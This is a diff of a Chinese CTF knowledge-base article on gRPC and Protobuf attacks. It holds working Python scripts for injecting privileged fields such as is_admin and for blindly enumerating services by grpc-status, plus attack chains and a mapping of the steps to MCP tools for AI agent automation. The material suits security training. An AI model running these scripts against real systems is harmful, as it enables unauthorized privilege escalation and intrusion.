@@ -3,153 +3,205 @@ id: "ctf-website/03-injection/grpc-protobuf"
 title: "gRPC / Protobuf 攻击"
 title_en: "gRPC and Protobuf Attacks"
 summary: >
-  介绍 gRPC 和 Protobuf 协议的专属攻击技术，包括 Protobuf 字段注入绕过 WAF、gRPC 服务/方法盲枚举利用 gRPC 错误码、gRPC-Web Payload 解码修改及 Protoscope 工具集成。适用于现代微服务架构的渗透测试。
+  gRPC/Protobuf 的关键不是只会改 Base64，而是还原 service/method/schema/metadata/compression/frame/field number 的完整 oracle。本篇覆盖 reflection 与盲枚举、gRPC-Web 解码、字段注入、unknown field 保留、metadata 认证差分、HTTP/2 trailer 状态、Protoscope 十六进制 diff 和 Evidence 模板。
 summary_en: >
-  Attack techniques specific to gRPC and Protobuf protocols including Protobuf field injection for WAF bypass, gRPC service/method blind enumeration using error codes, gRPC-Web payload decoding and modification, and Protoscope tool integration. Designed for modern microservice penetration testing.
+  gRPC/Protobuf work requires reconstructing service/method/schema/metadata/compression/frame/field-number oracles, not just editing Base64. Covers reflection and blind enumeration, gRPC-Web decoding, field injection, unknown-field preservation, metadata auth diffs, HTTP/2 trailer status, Protoscope hex diffs, and evidence templates.
 board: "ctf-website"
 category: "03-injection"
-signals: ["gRPC", "Protobuf", "field injection", "wire type", "varint", "reflection", "gRPC-Web", "Protoscope"]
+signals: ["gRPC", "Protobuf", "field injection", "wire type", "varint", "reflection", "gRPC-Web", "Protoscope", "grpc-status"]
 mcp_tools: ["http_probe", "kb_router"]
-keywords: ["gRPC攻击", "Protobuf", "protobuf注入", "gRPC枚举", "grpc-web", "protoscope", "field injection"]
+keywords: ["gRPC攻击", "Protobuf", "protobuf注入", "gRPC枚举", "grpc-web", "protoscope", "field injection", "HTTP/2"]
 difficulty: "advanced"
-tags: ["injection", "grpc", "protobuf", "microservices", "web-security", "ctf"]
+tags: ["injection", "grpc", "protobuf", "microservices", "ctf"]
 language: "zh-CN"
-last_updated: "2026-06-25"
-related_articles: []
+last_updated: "2026-07-04"
+related_articles: ["ctf-website/03-injection/hpp-crlf", "ctf-website/17-api-attacks/01-api-discovery-leak"]
 ---
 
 # gRPC / Protobuf 攻击
 
-## Protobuf 字段注入
+gRPC 题面经常把 Web API 的输入藏进 HTTP/2 frame、metadata 和 Protobuf field number。要先知道“服务端到底解析了哪个字段”，再谈提权、越权、SSRF 或注入。
 
-Protobuf 不存字段名只存 field number。如果新增了特权字段 (field 4 = is_admin)，WAF 不知道这个 number，但服务端接受。
+## 输入信号
 
-```python
-# protobuf_field_inject.py — 二进制 Protobuf 字段注入
-import struct
+| 信号 | 立即动作 | 命中样本 | 失败样本 |
+|---|---|---|---|
+| `Content-Type: application/grpc` | 读 `grpc-status` trailer 和 method path | `INVALID_ARGUMENT` 指向方法存在 | 始终 `UNIMPLEMENTED` |
+| gRPC-Web Base64 body | 解 frame + protobuf | 修改字段后响应状态变化 | 前端签名或压缩未处理 |
+| reflection 开启 | 拉 service/method/schema | `AdminService/GetFlag` 等内部方法可见 | reflection 被禁，转盲枚举 |
+| metadata 里有 token/tenant | 单变量改 `authorization/x-tenant` | method 可达性或数据域变化 | metadata 被网关固定 |
+| proto 字段未知 | append field number | 后端新版本接收 unknown field | unknown field 被丢弃 |
+| 错误含 field name/number | fuzz required/oneof/repeated | schema 反推成功 | 错误统一封装 |
 
-def encode_varint(value: int) -> bytes:
-    """Protobuf varint 编码"""
-    result = b""
-    while value > 127:
-        result += bytes([(value & 0x7F) | 0x80])
-        value >>= 7
-    result += bytes([value & 0x7F])
-    return result
+## 工作流
 
-def inject_field(payload: bytes, field_number: int, wire_type: int,
-                 value: bytes) -> bytes:
-    """在 Protobuf message 中注入额外字段"""
-    field_key = encode_varint((field_number << 3) | wire_type)
-    return payload + field_key + value
-
-# 使用: 在正常 Protobuf 请求后 append 特权字段
-# 正常: field 1 (username) = "user", field 2 (password) = "pass"
-# 注入: field 4 (is_admin\?"wire_type 0=varint) = 1 (true)
-normal_msg = b""  # 从 Burp 抓取的正常 Protobuf 请求
-injected = inject_field(normal_msg, field_number=4, wire_type=0,
-                        value=encode_varint(1))  # is_admin = true
-# → field 4 在后端新版本中存在，但 WAF 不理解
+```text
+识别 gRPC/gRPC-Web 入口
+  → 枚举 service/method 或拉 reflection
+  → 解 frame/protobuf，建立 baseline hex diff
+  → 逐字段注入/删除/类型变化
+  → metadata、compression、deadline 单变量对比
+  → 用 grpc-status/trailer/业务字段证明命中
 ```
 
-## gRPC 盲枚举
+## 0. 判定矩阵
+
+| 层 | 变量 | 观察点 |
+|---|---|---|
+| HTTP/2 path | `/pkg.Service/Method` | `grpc-status`, `:status`, trailer message |
+| gRPC frame | compression flag + length | 解码是否错位、服务端是否读 body |
+| Protobuf field | field number + wire type + value | 业务字段、权限、错误文本 |
+| metadata | auth/tenant/debug/deadline | 身份、租户、内部方法可达性 |
+| gRPC-Web | Base64 frame + trailers | 浏览器代理是否转发差异 |
+
+## 1. Frame 与 field 工具
 
 ```python
-# gRPC 即使禁用 reflection，不同状态返回不同 gRPC error code
-# UNIMPLEMENTED → 服务存在但方法不存在
-# NOT_FOUND → 服务不存在
-# INVALID_ARGUMENT → 方法存在但参数错误
-
-import requests, struct
-
-GRPC_ERROR_CODES = {
-    0: "OK",
-    5: "NOT_FOUND",
-    12: "UNIMPLEMENTED",
-    3: "INVALID_ARGUMENT",
-    7: "PERMISSION_DENIED",
-    16: "UNAUTHENTICATED",
-}
-
-def blind_grpc_enum(target: str, port: int = 50051):
-    """盲枚举 gRPC 服务和方法"""
-    SERVICES = ["UserService", "AdminService", "FlagService",
-                "AuthService", "ConfigService", "InternalService"]
-    METHODS = ["GetUser", "GetAdmin", "GetFlag", "Login",
-               "CreateUser", "DeleteUser", "UpdateConfig",
-               "ListUsers", "GetSecret", "Execute"]
-
-    for svc in SERVICES:
-        for method in METHODS:
-            # 构造 gRPC 请求 (HTTP/2 + Protobuf)
-            # 简化: 发送 http://target:port/svc.FullName/Method
-            r = requests.post(
-                f"https://{target}:{port}/{svc}/{method}",
-                headers={"Content-Type": "application/grpc"},
-                data=b"\x00\x00\x00\x00\x00"  # 最小 gRPC frame
-            )
-            grpc_status = r.headers.get("grpc-status", "unknown")
-            if grpc_status != "5":  # 不是 NOT_FOUND
-                print(f"[!] {svc}/{method}: {grpc_status}")
-```
-
-## gRPC-Web Payload 修改
-
-```python
-# gRPC-Web 使用 Base64 编码的 Protobuf → 可直接解码修改
+#!/usr/bin/env python3
+import argparse
 import base64
+import json
 
-def decode_grpc_web(payload_b64: str) -> bytes:
-    """解码 gRPC-Web payload"""
-    return base64.b64decode(payload_b64)
+def enc_varint(v):
+    out = []
+    while v > 0x7f:
+        out.append((v & 0x7f) | 0x80)
+        v >>= 7
+    out.append(v)
+    return bytes(out)
 
-def encode_grpc_web(data: bytes) -> str:
-    return base64.b64encode(data).decode()
+def field_key(num, wire):
+    return enc_varint((num << 3) | wire)
 
-# 从 Burp 抓取 gRPC-Web 请求
-captured = "CgVhZG1pbhIIdGVzdDEyMzQ="  # Base64 Protobuf
-decoded = decode_grpc_web(captured)
+def inject_varint(msg, num, value):
+    return msg + field_key(num, 0) + enc_varint(value)
 
-# 修改字段 #1 (username) 从 "admin" 改为 "admin\x00" (NUL bypass)
-# 或注入 field #3 (role) = "admin"
-modified = inject_field(decoded, field_number=3, wire_type=2,
-    value=b"\x05admin")  # wire_type=2 是 length-delimited
+def inject_bytes(msg, num, value):
+    b = value.encode() if isinstance(value, str) else value
+    return msg + field_key(num, 2) + enc_varint(len(b)) + b
 
-new_payload = encode_grpc_web(modified)
+def grpc_frame(msg, compressed=0):
+    return bytes([compressed]) + len(msg).to_bytes(4, "big") + msg
+
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--b64", help="grpc-web/base64 frame or raw protobuf")
+    ap.add_argument("--hex", help="raw protobuf hex")
+    ap.add_argument("--field", type=int, required=True)
+    ap.add_argument("--wire", choices=["varint", "bytes"], default="varint")
+    ap.add_argument("--value", required=True)
+    ap.add_argument("--wrap-frame", action="store_true")
+    args = ap.parse_args()
+    raw = bytes.fromhex(args.hex) if args.hex else base64.b64decode(args.b64)
+    if len(raw) > 5 and raw[0] in (0, 1) and int.from_bytes(raw[1:5], "big") == len(raw) - 5:
+        raw = raw[5:]
+    patched = inject_varint(raw, args.field, int(args.value)) if args.wire == "varint" else inject_bytes(raw, args.field, args.value)
+    out = grpc_frame(patched) if args.wrap_frame else patched
+    print(json.dumps({"hex": out.hex(), "base64": base64.b64encode(out).decode(), "diff_tail": out[-32:].hex()}, ensure_ascii=False))
+
+if __name__ == "__main__":
+    main()
 ```
 
-## Protoscope 工具集成
+成功样本：只追加一个 field 后，`grpc-status`、业务字段、权限或 flag 响应变化。失败样本：`invalid wire type`、`message length mismatch`、所有 field number 同一错误。
+
+## 2. 盲枚举 service/method
+
+```python
+#!/usr/bin/env python3
+import argparse
+import json
+import requests
+
+SERVICES = ["AuthService", "UserService", "AdminService", "FlagService", "InternalService", "ConfigService"]
+METHODS = ["Login", "GetUser", "ListUsers", "GetFlag", "Admin", "Debug", "UpdateConfig", "Search"]
+
+def call(base, svc, method, token=""):
+    headers = {"Content-Type": "application/grpc", "TE": "trailers"}
+    if token:
+        headers["Authorization"] = token
+    r = requests.post(f"{base.rstrip('/')}/{svc}/{method}", headers=headers, data=b"\x00\x00\x00\x00\x00", timeout=10)
+    return {
+        "service": svc,
+        "method": method,
+        "http": r.status_code,
+        "grpc_status": r.headers.get("grpc-status", ""),
+        "grpc_message": r.headers.get("grpc-message", ""),
+        "sample": r.text[:120],
+    }
+
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--base", required=True, help="https://host or http://host")
+    ap.add_argument("--token", default="")
+    args = ap.parse_args()
+    for s in SERVICES:
+        for m in METHODS:
+            res = call(args.base, s, m, args.token)
+            if res["grpc_status"] not in ("5", "12") or res["http"] not in (404, 501):
+                print(json.dumps(res, ensure_ascii=False))
+
+if __name__ == "__main__":
+    main()
+```
+
+判定：
+
+| `grpc-status` | 解释 | 下一步 |
+|---|---|---|
+| `0` | 方法调用成功 | 读业务字段/flag |
+| `3` | 方法存在，参数错误 | 反推 schema |
+| `7/16` | 方法存在但身份不足 | metadata/token/tenant 差分 |
+| `5/12` | 服务或方法不存在 | 换候选字典 |
+
+## 3. Metadata 与 gRPC-Web 差分
+
+| 变量 | Payload | 命中样本 |
+|---|---|---|
+| `authorization` | Bearer/JWT/API key/空值 | 身份或错误位置变化 |
+| `x-tenant-id` | public/admin/internal | 数据域变化 |
+| `x-debug` | `1`, `true` | 错误暴露 field name |
+| `grpc-timeout` | 极小/极大 | 触发不同超时分支 |
+| `x-grpc-web` | browser proxy headers | 代理层与后端差异 |
+
+## 4. Protoscope / hexdiff
 
 ```bash
-# Protoscope — Protobuf 可读格式
-echo "CgVhZG1pbhIIdGVzdDEyMzQ=" | base64 -d | protoscope
+# 解 gRPC-Web body
+python grpc_field_patch.py --b64 'AAAA...' --field 4 --wire varint --value 1 --wrap-frame
 
-# 输出: 1: {"admin"} 2: {"test1234"}
-# 编辑 field 1 的值 → protoscope -schema schema.proto | base64
-
-# 安装: go install github.com/protocolbuffers/protoscope/cmd/protoscope@latest
+# 可读化 protobuf
+echo '0a0561646d696e' | xxd -r -p | protoscope
 ```
+
+保留修改前后 hex diff：`field_key`, `wire_type`, `length`, `value` 必须能复查。
 
 ## 攻击链
 
-```
-gRPC reflection → 完整 schema → 发现 AdminService → 调用 → 提权
-Blind gRPC enum → 发现 FlagService/GetFlag → 直接调用 → flag
-Protobuf field injection → field 4 is_admin=true → 后端接受 → 权限提升
-gRPC → SQLi/SSRF via Protobuf field → 后端查询 → RCE
-gRPC-Web → decode → 修改 payload → re-encode → 绕过前端验证
+```text
+gRPC 入口
+  → reflection/盲枚举 service
+  → schema/field number 反推
+  → metadata 与 field 注入
+  → 权限、租户、debug、flag 差异
+  → 转 SQLi/SSRF/JWT/IDOR 下一跳
 ```
 
 ## Evidence
 
-记录: gRPC 服务/方法枚举结果、Protobuf 消息修改前后 hex diff、注入字段的 field number 和值、服务端响应差异
+| 项 | 记录内容 |
+|---|---|
+| 入口 | path、content-type、HTTP/2/gRPC-Web、TLS、代理层 |
+| 枚举 | service/method 候选、grpc-status、grpc-message |
+| protobuf | 原始 frame、hex diff、field number、wire type、value |
+| metadata | header/trailer、token/tenant/deadline 变量 |
+| 成功样本 | 方法可达、权限变化、内部数据、flag、下游注入差异 |
+| 失败样本 | length mismatch、unknown field dropped、统一 status |
+| 下一跳 | 字段注入转 SQLi/SSRF/IDOR；token 转 JWT；服务枚举转 API discovery |
 
 ## MCP 工具映射
 
-AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：
-
-| 攻击步骤 | MCP 工具 | 说明 |
-|---------|---------|------|
-| gRPC 端点探测 | `http_probe` | HTTP/2 探测 gRPC 服务 |
-| 按信号查技术 | `kb_router` | 搜索 grpc 相关技术文件 |
-
+| 步骤 | MCP 工具 | 说明 |
+|---|---|---|
+| 端点探测 | `http_probe` | 固定 gRPC path/header/body 变体 |
+| 知识路由 | `kb_router` | 按 gRPC、protobuf、grpc-web、field injection 搜索 |
